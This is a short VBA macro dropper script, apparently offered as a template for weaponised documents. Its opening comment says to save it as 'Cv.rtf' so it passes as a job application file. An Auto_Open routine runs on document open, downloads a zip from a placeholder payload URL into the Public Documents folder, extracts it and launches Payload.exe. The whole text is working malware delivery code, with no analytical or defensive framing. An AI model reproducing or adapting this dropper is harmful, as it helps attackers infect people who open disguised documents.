;Encode this script & Save it as Cv.rtf WinWord will do the job for you.

Sub Auto_Open()
HTTPDownload "http://zippedpayload", "C:\Users\Public\Documents\P.zip"
Execute

End Sub

Public Function HTTPDownload(myURL, myPath)
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FolderExists(myPath) Then
        strFile = objFSO.BuildPath(myPath, Mid(myURL, InStrRev(myURL, "/") + 1))
    ElseIf objFSO.FolderExists(Left(myPath, InStrRev(myPath, "\") - 1)) Then
        strFile = myPath
    End If
    Set objFile = objFSO.OpenTextFile(strFile, ForWriting, True)
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB(objHTTP.ResponseBody)
        objFile.Write Chr(AscB(MidB(objHTTP.ResponseBody, i, 1)))
    Next

End Function

 Public Function Execute() As Variant
        Dim args, num, ex, dr
    Dim var1, var2
    Dim objFSO, objFolder
    Dim objStream
    Dim objSha
    Dim WshShell
    Dim objSh
    Dim strFolder, strURL, strFile, strFull
    Dim strUnat, strCmdLine, strDmdLine
    ex = "cscript.exe C:\Users\Public\Documents\P\Payload.exe"
        Set WshShell = CreateObject("WScript.Shell")
    ZipFile = "C:\Users\Public\Documents\P.zip"
    ExtractTo = "C:\Users\Public\Documents\P"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(ExtractTo) Then
            fso.CreateFolder (ExtractTo)
    End If
    Set objShell = CreateObject("Shell.Application")
    Set FilesInZip = objShell.Namespace(ZipFile).items
    objShell.Namespace(ExtractTo).CopyHere (FilesInZip)
    Set fso = Nothing
    Set objShell = Nothing
    Set objSha = CreateObject("shell.application")
    objSha.ShellExecute "C:\Users\Public\Documents\P\Payload.exe", "Arguments", "C:\Users\Public\Documents\P\", "open", 1 ;etc
   End Function
